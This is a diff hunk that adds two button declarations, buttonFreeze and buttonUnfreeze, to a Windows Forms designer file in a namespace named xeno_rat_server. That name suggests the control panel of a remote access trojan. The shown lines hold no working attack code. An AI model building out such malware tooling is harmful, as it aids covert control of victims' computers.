@@ -184,5 +184,7 @@ namespace xeno_rat_server.Forms
         private System.Windows.Forms.Button button3;
         private System.Windows.Forms.Label label1;
         private System.Windows.Forms.CheckBox checkBox1;
+        private System.Windows.Forms.Button buttonFreeze;
+        private System.Windows.Forms.Button buttonUnfreeze;
     }
 }
